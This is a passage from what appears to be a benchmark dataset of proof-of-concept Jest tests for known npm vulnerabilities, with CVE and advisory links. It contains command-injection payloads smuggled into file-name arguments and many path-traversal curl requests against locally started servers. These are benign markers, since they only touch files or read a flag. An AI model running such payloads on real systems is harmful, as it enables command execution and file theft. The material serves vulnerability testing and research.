  let image = { path: ""& touch im-resize &"" };
  let output = { versions: [] };
  root(image, output, function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",https://github.com/Turistforeningen/node-im-resize/commit/de624dacf6a50e39fe3472af1414d44937ce1f03,index.js:11:3,https://security.snyk.io/vuln/SNYK-JS-IMRESIZE-544183; https://github.com/advisories/GHSA-r9vm-rhmf-7hxx
command-injection,CVE-2020-28432,theme-core,0.2.5,,command-injection/theme-core_0.2.5,"test(""Command Injection in theme-core"", (done) => {
  expect.assertions(2);
  const a = require(""theme-core"");
  const fs = require(""fs"");
  const path = ""./theme-core"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a.utils.sh(""touch theme-core"", true, function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
    done();
  });
});
",,lib/utils.js:16:17,https://security.snyk.io/vuln/SNYK-JS-THEMECORE-1050425; 
command-injection,CVE-2019-10788,im-metadata,3.0.1,,command-injection/im-metadata_3.0.1,"test(""Command Injection in im-metadata"", (done) => {
  expect.assertions(2);
  const metadata = require(""im-metadata"");
  const fs = require(""fs"");
  const path = ""./im-metadata"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  metadata(""./foo.jpg;touch im-metadata"", { exif: true }, function (
    error,
    metadata
  ) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",https://github.com/Turistforeningen/node-im-metadata/commit/ea15dddbe0f65694bfde36b78dd488e90f246639,index.js:15:3,https://security.snyk.io/vuln/SNYK-JS-IMMETADATA-544184; https://github.com/advisories/GHSA-qfxv-qqvg-24pg
command-injection,CVE-2020-28438,deferred-exec,0.3.1,,command-injection/deferred-exec_0.3.1,"test(""Command Injection in deferred-exec"", async () => {
  expect.assertions(2);
  const a = require(""deferred-exec"");
  const fs = require(""fs"");
  const path = ""./deferred-exec"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  await a("" touch deferred-exec "", {});
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",,lib/deferred-exec.js:42:19,https://security.snyk.io/vuln/SNYK-JS-DEFERREDEXEC-1050433; 
path-traversal,,songcaihong,1.0.0,,path-traversal/songcaihong_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in songcaihong"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/songcaihong/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:5:8,https://security.snyk.io/vuln/npm:songcaihong:20180306; 
path-traversal,,zhanglina,1.0.0,,path-traversal/zhanglina_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in zhanglina"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/zhanglina/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    done();
  });
});
",,index.js:10:8,https://security.snyk.io/vuln/npm:zhanglina:20180226; 
path-traversal,CVE-2020-8214,servey,2.2.0,3.0.0,path-traversal/servey_2.2.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in servey"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/servey/test/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,lib/server/index.js:60:21,https://security.snyk.io/vuln/SNYK-JS-SERVEY-174122; https://github.com/advisories/GHSA-v3px-6cc8-f8j3
path-traversal,,wenluhong111,1.0.0,,path-traversal/wenluhong111_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in wenluhong111"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/wenluhong111/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  let end_serv = ""fuser -k 8888/tcp"";
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    exec(end_serv, (error, stdout) => {
      done();
    });
  });
});
",,index.js:5:8,https://security.snyk.io/vuln/npm:wenluhong111:20180306; 
path-traversal,CVE-2017-16120,liyujing,1.1.0,,path-traversal/liyujing_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in liyujing"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/liyujing/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:5:8,https://security.snyk.io/vuln/npm:liyujing:20170510; https://github.com/advisories/GHSA-m3j9-p4x2-97q6
path-traversal,,yjmyjmyjm,1.0.0,,path-traversal/yjmyjmyjm_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in yjmyjmyjm"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/yjmyjmyjm/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:5:8,https://security.snyk.io/vuln/npm:yjmyjmyjm:20170617; https://github.com/advisories/GHSA-g376-whg7-896m
path-traversal,,my-sn,1.0.1,,path-traversal/my-sn_1.0.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 9000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in my-sn"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/my-sn/server.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,server.js:41:7,https://security.snyk.io/vuln/npm:my-sn:20180226; 
path-traversal,,serverfff,1.1.1,,path-traversal/serverfff_1.1.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serverfff"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serverfff/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:7:8,https://security.snyk.io/vuln/npm:serverfff:20180306; 
path-traversal,,lander,1.0.0,,path-traversal/lander_1.0.0,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in lander"", (done) => {
  expect.assertions(1);
  const pkg = require(""lander"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8988/tcp"", () => {});
  } catch (e) {}
  pkg(8988);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8988${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:33:25,https://security.snyk.io/vuln/npm:lander:20180226; 
path-traversal,CVE-2017-16195,pytservce,1.0.0,,path-traversal/pytservce_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in pytservce"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/pytservce/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    done();
  });
});
",,index.js:13:8,https://security.snyk.io/vuln/npm:pytservce:20170508; https://github.com/advisories/GHSA-jwjq-vp53-ph6m
path-traversal,,getstats,1.0.6,,path-traversal/getstats_1.0.6,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 9001/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in getstats"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9001/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/getstats/server.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9001${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,server.js:37:12,https://security.snyk.io/vuln/npm:getstats:20180226; 
path-traversal,,gfm-srv,1.1.2,,path-traversal/gfm-srv_1.1.2,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in gfm-srv"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/gfm-srv/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,lib/server.js:65:12,https://security.snyk.io/vuln/npm:gfm-srv:20180226; 
path-traversal,CVE-2017-16221,yzt,1.4.0,,path-traversal/yzt_1.4.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 9987/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in yzt"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9987/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/yzt/node.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9987${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,node.js:5:8,https://security.snyk.io/vuln/npm:yzt:20170509; https://github.com/advisories/GHSA-q48g-p5cx-c7c7
path-traversal,CVE-2019-15596,statics-server,0.0.9,,path-traversal/statics-server_0.0.9,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in statics-server"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/statics-server/index.js"";
  server_process = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:37:20,https://security.snyk.io/vuln/SNYK-JS-STATICSSERVER-472065; https://github.com/advisories/GHSA-j27j-4w6m-8fc4
path-traversal,,hangersteak,0.2.2,0.2.5,path-traversal/hangersteak_0.2.2,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in hangersteak"", (done) => {
  expect.assertions(1);
  const http = require(""http"");
  const hangersteak = require(""hangersteak"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 3006/tcp"", () => {});
  } catch (e) {}
  const server = http.createServer((req, res) => {
    hangersteak(req, res);
  });
  server.listen(3006);
  let attack_string = `curl -v --path-as-is ""http://localhost:3006${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",https://github.com/eldoy/hangersteak/commit/9e853cced065c5a98f242c7ac75438d035f63532,lib/hangersteak.js:61:23,https://security.snyk.io/vuln/SNYK-JS-HANGERSTEAK-608973; 
path-traversal,,easy-node-server,1.2.1,,path-traversal/easy-node-server_1.2.1,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in easy-node-server"", (done) => {
  expect.assertions(1);
  const pkg = require(""easy-node-server"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8895/tcp"", () => {});
  } catch (e) {}
  pkg.start({
    port: 8895,
    assetPath: __dirname,
  });
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8895${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:49:16,https://security.snyk.io/vuln/npm:easy-node-server:20180226; 
path-traversal,,ptest,1.0.0,,path-traversal/ptest_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in ptest"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/ptest/server.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,server.js:43:5,https://security.snyk.io/vuln/npm:ptest:20180226; 
path-traversal,,httpea,3.0.4,,path-traversal/httpea_3.0.4,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in httpea"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/httpea/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:48:19,https://security.snyk.io/vuln/npm:httpea:20180226; 
path-traversal,,xingbaohai,1.0.0,,path-traversal/xingbaohai_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in xingbaohai"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/xingbaohai/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:8:8,https://security.snyk.io/vuln/npm:xingbaohai:20180226; 
path-traversal,CVE-2017-16163,dylmomo,1.0.0,,path-traversal/dylmomo_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in dylmomo"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/dylmomo/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:14:8,https://security.snyk.io/vuln/npm:dylmomo:20170518; https://github.com/advisories/GHSA-hpw4-m59j-9p52
path-traversal,CVE-2017-16201,zjjserver,1.0.0,,path-traversal/zjjserver_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 4848/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in zjjserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 4848/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/zjjserver/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:4848${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    done();
  });
});
",,index.js:19:8,https://security.snyk.io/vuln/npm:zjjserver:20170509; https://github.com/advisories/GHSA-xgf5-5gjr-4hjq
path-traversal,,paopao613,1.0.0,,path-traversal/paopao613_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in paopao613"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/paopao613/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:7:8,https://security.snyk.io/vuln/npm:paopao613:20180315; 
path-traversal,CVE-2018-16482,mcstatic,0.0.20,= 0.0.20,path-traversal/mcstatic_0.0.20,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in mcstatic"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/mcstatic/bin/mcstatic"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,lib/responseHandlers.js:23:21,https://security.snyk.io/vuln/npm:mcstatic:20180425; https://github.com/advisories/GHSA-cxmj-qjv6-vx9p
path-traversal,CVE-2017-16089,serverlyr,1.1.0,,path-traversal/serverlyr_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serverlyr"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serverlyr/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:5:8,https://security.snyk.io/vuln/npm:serverlyr:20170518; https://github.com/advisories/GHSA-46q2-93hm-52p5
path-traversal,CVE-2017-16108,gaoxiaotingtingting,1.1.0,,path-traversal/gaoxiaotingtingting_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in gaoxiaotingtingting"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/gaoxiaotingtingting/index.js"";
  let exe = exec(server, (error, stdout) => {});
